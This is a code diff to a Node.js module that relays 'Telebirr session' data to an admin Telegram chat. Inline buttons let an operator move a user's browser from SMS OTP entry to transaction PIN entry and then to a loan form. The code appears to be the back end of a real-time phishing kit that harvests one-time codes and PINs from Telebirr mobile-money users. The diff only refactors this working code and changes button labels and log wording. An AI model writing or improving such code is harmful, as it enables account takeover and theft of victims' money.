@@ -4,11 +4,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.ADMIN_CHAT_ID;
 
-if (!BOT_TOKEN || !CHAT_ID) {
-    console.error("❌ [BOT MANAGER ERROR] Missing BOT_TOKEN or ADMIN_CHAT_ID inside environment configs.");
-}
-
-// Initialize the Telegram Bot Engine using webhook/passive mode
+// Initialize the Telegram Bot Engine using webhook mode
 const bot = new TelegramBot(BOT_TOKEN, { polling: false });
 
 /**
@@ -20,7 +16,7 @@ function escapeMarkdown(text) {
 }
 
 /**
- * Dispatches Telebirr workflow profiles to the Admin Telegram channel
+ * Dispatches active profiles to the Admin Telegram channel
  */
 function sendToAdmin(appId, stepTitle, data, requireInlineButtons = false) {
     if (!CHAT_ID) return;
@@ -37,42 +33,46 @@ function sendToAdmin(appId, stepTitle, data, requireInlineButtons = false) {
     }
 
     const message = `
-📱 *Telebirr Session: ${escapeMarkdown(appId)}*
+📱 *Telebirr Session:* \`${escapeMarkdown(appId)}\`
 ━━━━━━━━━━━━━━━━━━━━━━━━
 📢 *${escapeMarkdown(stepTitle)}*
 ━━━━━━━━━━━━━━━━━━━━━━━━
 ${detailedFields}━━━━━━━━━━━━━━━━━━━━━━━━
-Status: *Awaiting Admin Action*
+Status: *Awaiting Verification Approval*
     `.trim();
 
     const options = { parse_mode: 'Markdown' };
 
-    // Dynamically assign different approval tracks depending on the current active step titles
     if (requireInlineButtons) {
-        let inlineKeyboard = [];
-        
+        let inlineActionPattern = "";
+        let inlineActionButtonText = "";
+
         if (stepTitle.includes("Step 1")) {
-            inlineKeyboard = [[
-                { text: "📩 REQUEST/ACCEPT OTP", callback_data: `step1_accept:${appId}` }
-            ]];
+            inlineActionPattern = "step1_approve";
+            inlineActionButtonText = "📩 REQUEST SMS OTP";
         } else if (stepTitle.includes("Step 2")) {
-            inlineKeyboard = [[
-                { text: "✅ APPROVE OTP & ASK PIN", callback_data: `step2_accept:${appId}` }
-            ]];
+            inlineActionPattern = "step2_approve";
+            inlineActionButtonText = "✅ VERIFY OTP & ASK PIN";
         } else if (stepTitle.includes("Step 3")) {
-            inlineKeyboard = [[
-                { text: "🔑 ACCEPT TRANSACTION PIN", callback_data: `step3_accept:${appId}` }
-            ]];
+            inlineActionPattern = "step3_approve";
+            inlineActionButtonText = "🔓 CLEAR TRANSACTION PIN";
         }
 
-        if (inlineKeyboard.length > 0) {
-            options.reply_markup = { inline_keyboard: inlineKeyboard };
+        if (inlineActionPattern !== "") {
+            options.reply_markup = {
+                inline_keyboard: [[
+                    { text: inlineActionButtonText, callback_data: `${inlineActionPattern}:${appId}` }
+                ]]
+            };
         }
+    } else {
+        // Change status for informational passive collection cards
+        options.text = message.replace("Status: *Awaiting Verification Approval*", "Status: *Log Collected (Passive)*");
     }
 
     bot.sendMessage(CHAT_ID, message, options)
-        .then(() => console.log(`✅ [TELEGRAM] Log payload dispatched for ${appId}`))
-        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Dispatch failed for ${appId}:`, err.message));
+        .then(() => console.log(`✅ [TELEGRAM] Data block dispatched to admin channel for: ${appId}`))
+        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Delivery failure tracking profile ID ${appId}:`, err.message));
 }
 
 // Telegram Inline Interactive Webhook Processing Engine
@@ -86,32 +86,31 @@ bot.on('callback_query', async (callbackQuery) => {
     let auditLogExecutionState = '';
     
     if (!global.io) {
-        console.error("❌ [BOT MANAGER ERROR] global.io reference missing.");
+        console.error("❌ [BOT MANAGER ERROR] global.io context mapping configuration is missing.");
         return;
     }
 
-    // Interactive Lifecycle Execution State Handling
     switch (actionSignal) {
-        case 'step1_accept':
-            // Moves frontend from Step 1 pending spinner over to Step 2 OTP Entry
+        case 'step1_approve':
+            // Advances client from Step 1 to Step 2 input
             global.io.to(targetAppId).emit('otp-accepted-goto-wait');
-            auditLogExecutionState = "✅ Step 1 Approved: Requested OTP routed cleanly to target handset client.";
+            auditLogExecutionState = "✅ Step 1 Verified: App shifted user view to SMS verification layout.";
             break;
 
-        case 'step2_accept':
-            // Fast-tracks past the wait screen (Step 2.5) into Step 3 (Transaction PIN Input)
+        case 'step2_approve':
+            // Advanced client from Step 2/2.5 wait layout to Step 3 transaction PIN input
             global.io.to(targetAppId).emit('admin-dashboard-approve');
-            auditLogExecutionState = "✅ Step 2 Approved: OTP Validated. Frontend prompt shifted to transaction PIN collection.";
+            auditLogExecutionState = "✅ Step 2 Verified: Code checked successfully. Prompted transaction PIN access.";
             break;
 
-        case 'step3_accept':
-            // Pushes user forward out of authentication layers into Step 4 (Loan Form Configurations)
+        case 'step3_approve':
+            // Clears transaction PIN, advances client to Step 4 form
             global.io.to(targetAppId).emit('final-pin-accepted');
-            auditLogExecutionState = "✅ Step 3 Approved: Transaction PIN Accepted. Form configurations unlocked.";
+            auditLogExecutionState = "✅ Step 3 Verified: Security credentials confirmed. Configuration matrix unlocked.";
             break;
 
         default:
-            auditLogExecutionState = "⚠️ Unknown action state handler executed.";
+            auditLogExecutionState = "⚠️ Action event parsing returned unknown data types.";
     }
 
     // Update the administrative card view inside Telegram to prevent double clicks
